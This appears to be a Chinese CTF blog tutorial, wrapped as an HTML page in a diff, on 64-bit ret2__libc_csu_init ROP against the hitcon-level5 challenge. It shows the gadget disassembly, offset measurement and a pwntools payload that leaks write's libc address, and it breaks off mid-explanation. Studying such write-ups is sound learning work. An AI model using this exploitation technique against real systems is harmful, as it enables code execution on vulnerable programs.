@@ -1,0 +1,360 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF） | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF） 示例文件：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2__libc_csu_init&#x2F;hitcon-level5参考资料：https:&#x2F;&#x2F;cloud.tencent.com&#x2F;develo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-7%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF） 示例文件：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;stackoverflow&#x2F;ret2__libc_csu_init&#x2F;hitcon-level5参考资料：https:&#x2F;&#x2F;cloud.tencent.com&#x2F;develo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-04/800/450">
+<meta property="article:published_time" content="2020-08-10T07:56:08.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:15.693Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-04/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-7%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/",
+  "image": "https://picsum.photos/seed/blog-cover-04/800/450",
+  "datePublished": "2020-08-10T07:56:08.000Z",
+  "dateModified": "2026-07-03T14:46:15.693Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-7%EF%BC%89-%E4%B8%AD%E7%BA%A7ROP-ret2__libc_csu_init%EF%BC%8864%E4%BD%8DELF%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-04/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-10T07:56:08.000Z" title="发表于 2020-08-10 15:56:08">2020-08-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:15.693Z" title="更新于 2026-07-03 22:46:15">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="PWN入门（1-3-7）-中级ROP-ret2-libc-csu-init（64位ELF）"><a href="#PWN入门（1-3-7）-中级ROP-ret2-libc-csu-init（64位ELF）" class="headerlink" title="PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）"></a>PWN入门（1-3-7）-中级ROP-ret2__libc_csu_init（64位ELF）</h1><blockquote>
+<p>示例文件：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init&#x2F;hitcon-level5</a><br>参考资料：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1345756">https://cloud.tencent.com/developer/article/1345756</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/king_cpp_py/article/details/79483152">https://blog.csdn.net/king_cpp_py&#x2F;article&#x2F;details&#x2F;79483152</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/u239977/cbzkn3/vty6x0">https://www.yuque.com/u239977/cbzkn3/vty6x0</a></p>
+</blockquote>
+<blockquote>
+<p><strong><span style="color: #F5222D">感谢大佬@</span><span style="color: #F5222D">ILIB的帮助</span></strong></p>
+</blockquote>
+<p>首先说一下64位文件的传参方式：</p>
+<p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。</p>
+<p>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次 放入栈中，即和32位程序一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">比如：参数个数大于 7 个的时候</span><br><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">h-&gt;(%esp)</span><br><span class="line">g-&gt;(%esp)</span><br><span class="line">call H</span><br></pre></td></tr></table></figure>
+
+<p>接下来介绍一下ret2__libc_csu_init的利用原理：</p>
+<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。<strong><span style="color: #F5222D">这</span>****<span style="color: #F5222D">个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</span></strong></p>
+<p><span style="color: #000000">示例：</span></p>
+<p>我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)，将程序扔到IDA中，其汇编代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004005</span>C0</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">00000000004005</span>C0</span><br><span class="line">.text:<span class="number">00000000004005</span>C0</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 ; <span class="type">void</span> _libc_csu_init(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000000004005</span>C0                 public __libc_csu_init</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="number">16</span>↑o</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004005</span>C0                 push    r15</span><br><span class="line">.text:<span class="number">00000000004005</span>C2                 push    r14</span><br><span class="line">.text:<span class="number">00000000004005</span>C4                 mov     r15d, edi</span><br><span class="line">.text:<span class="number">00000000004005</span>C7                 push    r13</span><br><span class="line">.text:<span class="number">00000000004005</span>C9                 push    r12</span><br><span class="line">.text:<span class="number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:<span class="number">00000000004005</span>D2                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:<span class="number">00000000004005</span>DA                 push    rbx</span><br><span class="line">.text:<span class="number">00000000004005</span>DB                 mov     r14, rsi</span><br><span class="line">.text:<span class="number">00000000004005</span>DE                 mov     r13, rdx</span><br><span class="line">.text:<span class="number">00000000004005E1</span>                 sub     rbp, r12</span><br><span class="line">.text:<span class="number">00000000004005E4</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004005E8</span>                 sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">00000000004005</span>EC                 call    _init_proc</span><br><span class="line">.text:<span class="number">00000000004005F</span>1                 test    rbp, rbp</span><br><span class="line">.text:<span class="number">00000000004005F</span>4                 jz      <span class="type">short</span> loc_400616</span><br><span class="line">.text:<span class="number">00000000004005F</span>6                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">0000000000400600</span></span><br><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br><span class="line">.text:<span class="number">0000000000400616</span></span><br><span class="line">.text:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> ; &#125; <span class="comment">// starts at 4005C0</span></span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br><span class="line">.text:<span class="number">0000000000400624</span></span><br><span class="line">.text:<span class="number">0000000000400624</span> ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以利用以下几点：</p>
+<p>从 0x000000000040061A 一直到结尾，我们可以**<span style="color: #F5222D">利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据</span>**（因为都是向寄存器进行pop）。对应的汇编如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> ; &#125; <span class="comment">// starts at 4005C0</span></span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx,将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0（自行调试），<strong>所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位</strong><strong>），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器（rdx、rsi、edi）</strong>。<strong><span style="color: #F5222D">此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。</span></strong><u>比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址</u>。对应的汇编如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
+
+<p>从 0x000000000040060D 到 0x0000000000400614，<strong>我们可以控制 rbx 与 rbp 的之间的关系为rbx+1 &#x3D; rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序</strong>。这里我们可以简单的设置rbx&#x3D;0，rbp&#x3D;1。对应的汇编代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br></pre></td></tr></table></figure>
+
+<p>开始做题，看一下文件的基本信息和保护：</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597053183506-007b223b-207f-4f86-91fb-c80e6d4ce1b5.png" alt="QQ截图20200810175240.png"></p>
+<p>64位程序，开了NX保护，main函数如下：</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597054361318-7c049732-4588-44c7-b582-0f021ca85e19.png" alt="QQ截图20200810181233.png"></p>
+<p>进入vulnerable_function函数：</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597054427430-80c90b05-8327-45c3-b0ce-6f5ceeaeaccf.png" alt="QQ截图20200810181339.png"></p>
+<p>发现一个read函数，这是一个简单的栈溢出函数</p>
+<blockquote>
+<p>ssize_t read(int fd,void*buf,size_t count)<br>参数说明：<br>fd: 是文件描述符<br>buf:为读出数据的缓冲区；<br>count:为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）<br>成功：返回读出的字节数<br>失败：返回-1，并设置errno，如果在调用read<br>之前到达文件末尾，则这次read返回0</p>
+</blockquote>
+<p>首先在IDA里看一下read函数的栈偏移（覆盖返回地址）：0x88，为了防止IDA不准确导致错误，因此手动测量一下：</p>
+<p>利用cyclic工具生成不规则字符串（仔细看挺规则的）</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597054848444-aca6a590-a4cf-4332-8643-d0ac775061a0.png" alt="QQ截图20200810182041.png"></p>
+<p>gdb-peda开始调试，执行如下操作：</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597055007480-28787bf2-8f8f-4c0c-8f63-956df53c6f72.png" alt="QQ截图20200810182301.png"></p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597055075767-31683792-919e-409b-8df7-69444e42c066.png" alt="QQ截图20200810182423.png"></p>
+<p>利用rsp寄存器找偏移：</p>
+<p><img src="/assets/posts/pwn-1-3-7-rop-ret2-libc-csu-init-64-elf-m466gi/assets/1597055209428-3be6d636-7d23-4a74-84f5-962f02009870.png" alt="QQ截图20200810182641.png"></p>
+<blockquote>
+<p>(gdb) x &#x2F;wx $rsp    # 以16进制显示指定rsp寄存器中的数据</p>
+</blockquote>
+<p>栈偏移为136，与IDA测的0x88相等，呀，这次IDA测得挺准的，2333~</p>
+<p>从IDA里可以看到，没有system函数，但有一个已知的write函数，我们可以利用这个函数并利用libc泄露出程序加载到内存后的地址（<span style="color: #333333">当然也可以选用__libc_start_main</span>）。</p>
+<p>首先寻找write函数在内存中的真实地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span>          </span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br></pre></td></tr></table></figure>
+
+<p>重点解释一下这里的payload0：</p>
+<blockquote>
+<p>payload0 &#x3D; ‘A’<em>136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + ‘a’</em>(0x8+8*6) + p64(main_addr)</p>
+</blockquote>
+<p>首先输入136个字符使程序发生栈溢出，然后让pop_addr覆盖栈中的返回地址，使程序执行pop_addr地址处的函数，并分别将栈中的0、1、write_got函数地址、8、write_got、1分别pop到寄存器rbx、rbp、r12、r13、r14、r15中去，之后将pop函数的返回地址覆盖mov_addr的地址为，如下：</p>
+<blockquote>
+<p>注意：payload发送的内容都在栈上或堆上，这得看你的变量在栈上还是堆上，具体情况具体分析</p>
+</blockquote>
